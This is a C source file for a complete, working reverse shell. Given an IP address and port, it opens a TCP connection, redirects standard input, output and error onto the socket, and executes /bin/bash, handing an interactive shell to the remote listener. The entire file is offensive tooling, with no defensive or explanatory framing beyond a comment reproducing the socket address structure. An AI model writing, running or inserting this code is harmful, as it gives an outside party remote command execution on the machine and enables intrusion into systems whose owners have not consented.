#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


/*
*		Network structure:
*
*		struct sockaddr_in {
*            sa_family_t    sin_family; // address family: AF_INET 
*            in_port_t      sin_port;   // port in network byte order 
*            struct in_addr sin_addr;   // internet address 
*       };
*
*       // Internet address. 
*       struct in_addr {
*            uint32_t       s_addr;     // address in network byte order 
*       };
*/

#define LOG_ERROR(x)\
	do { fprintf(stderr, "[x] %s : %d : %d - " x "\n", __FILE__, __LINE__, errno); } while(0)

typedef enum {
	LocAddress = 1,
	LocPort,
} ArgvLocs;

int main(int argc, char** argv, char** envp)
{
	struct sockaddr_in addr = {0};
	unsigned short     port = 0;
	const char*        netaddr = NULL;
	pid_t              cpid = -1;
	int                sock = -1;

	if(argc < 3) {
		printf("Usage:\n\t<binary>\t<target ip>\t<port>\n");
		return 0;
	}

	netaddr = argv[LocAddress];
	port = atoi(argv[LocPort]);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if(0 == inet_aton(netaddr, &addr.sin_addr)) {
		LOG_ERROR("Invalid address provided!");
		return 0;
	}
	
	printf("[*] Creating socket...\n");
	if(-1 == (sock = socket(AF_INET, SOCK_STREAM, 0))) {
		LOG_ERROR("Socket creation failed!");
		return 0;
	}

	printf("[*] Connecting to %s:%hu\n", netaddr, port);
	if(connect(sock, (struct sockaddr*)&addr, sizeof(addr))) {
		LOG_ERROR("Connection failed!");
		goto Cleanup;
	}
    printf("[*] Preparing to redirect I/O\n");
	if(-1 == dup2(sock, STDOUT_FILENO)) {
		LOG_ERROR("Redirection  or stdout failed!");
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDIN_FILENO)) {
		LOG_ERROR("Redirection for stdin failed!");
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDERR_FILENO)) {
		LOG_ERROR("Redirection for stderr failed!");
		goto Cleanup;
	}
	fprintf(stdout, "[*] Connected. Preparing to execute bash:\n");
	execlp("/bin/bash", "bash", NULL);

Cleanup:
	close(sock);
	return 0;
}